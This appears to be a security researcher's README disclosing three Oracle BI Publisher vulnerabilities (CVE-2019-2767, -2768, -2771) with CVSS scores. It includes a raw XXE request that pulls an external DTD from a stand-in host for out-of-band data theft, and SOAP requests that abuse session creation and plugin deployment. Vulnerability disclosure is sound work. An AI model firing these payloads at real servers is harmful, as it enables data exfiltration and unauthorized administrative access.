# Oracle-BI-bugs

## CVE-2019-2767
 * Subject: XXE IN CONVERT SERVLET
 * CVSSv3.0 Base Score: 7.2
 * CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
 
```
GET /xmlpserver/convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//ehost%3a1337/ev.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123 HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflat
Connection: close
Upgrade-Insecure-Requests: 1
```

## CVE-2019-2768
 * Subject: ACCESS TO ADMIN SERVICES, SESSION GENERATION ERROR
 * CVSSv3.0 Base Score: 7.5
 * CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
 
Oracle BI has xmlpserver which uses an administrator to configure the server. To use xmlpserver services, the administrator needs to create a session using createSession function.
```
POST /xmlpserver/services/XMLPService HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.179:9502/xmlpserver/services
Connection: close
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.204.179:9502
Content-Length: 610

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:rep="http://xmlns.oracle.com/oxp/service/report">
   <soapenv:Header/>
   <soapenv:Body>
      <rep:createSession soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <username xsi:type="xsd:string">weblogic</username>
         <password xsi:type="xsd:string">asdQWE123</password>
         <domain xsi:type="xsd:string">bi</domain>
      </rep:createSession>
   </soapenv:Body>
</soapenv:Envelope>

```
```
POST /xmlpserver/services/v2/PluginService HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.179:9502/xmlpserver/services
Upgrade-Insecure-Requests: 1
SOAPAction: 
Content-Type: text/xml;charset=UTF-8
Host: 192.168.204.179:9502
Content-Length: 431

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:v2="http://xmlns.oracle.com/oxp/service/v2">
   <soapenv:Header/>
   <soapenv:Body>
      <v2:deploy>
         <v2:sessionToken>-1626402211</v2:sessionToken>
         <v2:appPath>0</v2:appPath>
         <v2:pluginName>1</v2:pluginName>
         <v2:uploadedData>2</v2:uploadedData>
      </v2:deploy>
   </soapenv:Body>
</soapenv:Envelope>
```

## CVE-2019-2771
 * Subject: BIP BYPASS FONT UPLOAD
 * CVSSv3.0 Base Score: 8.2
 * CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:H/A:L
 
![web](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f1.png)

![upload](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f2.png)

![write file](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f3.png)

![file on the system](https://github.com/vah13/Oracle-BI-bugs/blob/master/img/f4.png)
